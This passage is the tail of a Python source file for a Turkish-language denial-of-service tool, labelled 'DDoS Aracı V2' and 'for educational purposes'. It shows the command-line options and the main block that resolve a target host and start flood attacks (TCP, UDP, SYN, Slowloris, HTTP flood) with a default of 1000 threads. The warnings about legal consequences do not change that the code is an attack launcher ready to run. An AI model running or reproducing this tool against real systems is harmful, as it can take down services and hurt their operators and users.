    print(f"{Colors.RED}Bu aracı yalnızca kendi sistemlerinizde veya izin aldığınız sistemlerde test amaçlı kullanın.{Colors.ENDC}")
    print(f"{Colors.RED}İzinsiz saldırılar, hapis cezası ve para cezası dahil olmak üzere ciddi yasal sonuçlar doğurabilir.{Colors.ENDC}")
    
    input(f"\n{Colors.GREEN}[+] Ana menüye dönmek için ENTER tuşuna basın...{Colors.ENDC}")

# Komut satırı argümanlarını işleme
def parse_arguments():
    parser = argparse.ArgumentParser(description="DDoS Aracı V2 - Eğitim Amaçlıdır")
    
    parser.add_argument("-t", "--target", help="Hedef IP veya domain")
    parser.add_argument("-p", "--port", type=int, help="Hedef port")
    parser.add_argument("-a", "--attack", choices=["tcp", "udp", "http", "syn", "slowloris", "http-flood"], help="Saldırı türü")
    parser.add_argument("-th", "--threads", type=int, default=1000, help="İş parçacığı sayısı")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Saldırı süresi (saniye)")
    parser.add_argument("-i", "--intensity", type=int, default=5, help="Yoğunluk seviyesi (1-10)")
    parser.add_argument("-s", "--ssl", action="store_true", help="SSL/TLS kullan")
    parser.add_argument("--path", default="/", help="HTTP isteği için yol")
    
    return parser.parse_args()

# Ana program
if __name__ == "__main__":
    # Komut satırı argümanlarını kontrol et
    args = parse_arguments()
    
    if args.target and args.port and args.attack:
        # Komut satırından saldırı başlat
        try:
            target = args.target
            if '/' in target or ':' in target:
                target = extract_domain_from_url(target)
            
            target_ip = socket.gethostbyname(target)
            
            attack = DDoSAttack(
                target_ip,
                args.port,
                args.attack.upper(),
                args.threads,
                args.duration,
                args.ssl,
                args.path,
                args.intensity
            )
            
            print_banner()
            print(f"\n{Colors.CYAN}{Colors.BOLD}=== SALDIRI BAŞLATILIYOR ==={Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Hedef: {target} ({target_ip}){Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Port: {args.port}{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Yol: {args.path}{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Saldırı Türü: {args.attack.upper()}{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] İş Parçacığı: {args.threads}{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Süre: {args.duration} saniye{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Yoğunluk: {args.intensity}/10{Colors.ENDC}")
            
            if args.ssl:
                print(f"{Colors.BLUE}[*] SSL/TLS: Aktif{Colors.ENDC}")
            
            attack.start()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Program kullanıcı tarafından sonlandırıldı.{Colors.ENDC}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Colors.RED}[!] Hata: {str(e)}{Colors.ENDC}")
            sys.exit(1)
    else:
        # Menü arayüzünü başlat
        try:
            main_menu()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Program kullanıcı tarafından sonlandırıldı.{Colors.ENDC}")
            sys.exit(0)
